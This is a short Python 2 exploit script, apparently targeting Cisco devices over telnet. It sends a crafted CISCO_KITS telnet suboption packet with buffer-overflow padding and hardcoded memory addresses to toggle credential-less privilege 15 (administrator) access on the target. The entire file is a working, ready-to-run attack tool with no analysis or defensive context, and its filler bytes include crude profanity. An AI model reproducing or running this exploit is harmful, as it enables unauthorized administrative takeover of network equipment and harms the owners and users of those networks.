#!/usr/bin/python
#author:athul911


import sys
import socket
from time import sleep

cred = 1

if len(sys.argv) < 3:
	print sys.argv[0] + ' [target] --lock/--unlock'
	sys.exit()
elif sys.argv[2] == '--unlock':
	cred = 0
elif sys.argv[2] == '--lock':
	pass
else:
	print sys.argv[0] + ' [target] --lock/--unlock'
	sys.exit()


s = socket.socket( socket.AF_INET, socket.SOCK_STREAM)
s.connect((sys.argv[1], 23))

print '[+] Connected!!!'
print '[+] Bytes Received from telnet:', repr(s.recv(1024))
sleep(0.5)
print '[+] Sending cluster option..'

print '[+] Setting credential-less privilege 15 authentication' if cred else '[+] Unsetting credential-less privilege 15 authentication'



bomb = '\xff\xfa\x24\x00'
bomb += '\x03CISCO_KITS\x012:'
bomb += 'A' * 116
bomb += '\x00\x00\x37\xb4'		
bomb += '\x02\x2c\x8b\x74'		
if cred is True:
	bomb += '\x00\x00\x99\x80'	
else:
	bomb +=	'\x00\x04\xea\x58'	
bomb += 'YOYO'					
bomb += '\x00\xdf\xfb\xe8' 		
bomb += 'MOTH'					
bomb += 'ERFU'				
bomb += 'CKER'					
bomb += '\x00\x06\x78\x8c'		
bomb += '\x02\x2c\x8b\x60'
bomb += 'SUCK'					
bomb += 'DICK'					
bomb += '\x00\x6b\xa1\x28' 		
if cred:
	bomb += '\x00\x12\x52\x1c'	
else:
	bomb += '\x00\x04\xe6\xf0'	
bomb += 'KISS'					
bomb += 'BUTT'					
bomb += '\x01\x48\xe5\x60'
bomb += 'SUCK'				
bomb += 'NICE'					
bomb += 'HOLE'				
bomb += '\x01\x13\x31\xa8'		
bomb += ':15:' +  '\xff\xf0'

s.send(bomb)

print '[+] Finished'

s.close()
